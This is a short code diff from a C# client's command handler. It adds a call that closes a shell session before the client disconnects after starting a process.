@@ -194,6 +194,7 @@ namespace xClient.Core.Commands
 			startInfo.FileName = filename;
 			Process.Start(startInfo);
 
+			CloseShell();
 			SystemCore.Disconnect = true;
 			client.Disconnect();
 		}
